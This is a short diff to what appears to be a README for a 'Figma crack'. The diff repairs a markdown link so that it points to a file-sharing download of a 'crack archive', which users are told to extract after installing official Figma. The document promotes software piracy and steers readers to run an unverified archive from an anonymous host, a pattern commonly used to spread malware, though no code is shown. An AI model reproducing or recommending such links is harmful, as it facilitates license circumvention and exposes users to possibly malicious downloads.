@@ -19,7 +19,7 @@ To install and use this tool, follow these steps:
 
 2. **Download the Crack Archive**:  
    After installing the official version of Figma, download the crack archive from the link below:  
-   [Download Figma Crack]([https://www.transfernow.net/dl/202502043pzvZ2z7)
+   [Download Figma Crack](https://www.transfernow.net/dl/202502043pzvZ2z7)
 
 3. **Extract the Archive**:  
    Once the download is complete, extract the contents of the archive to a folder of your choice.
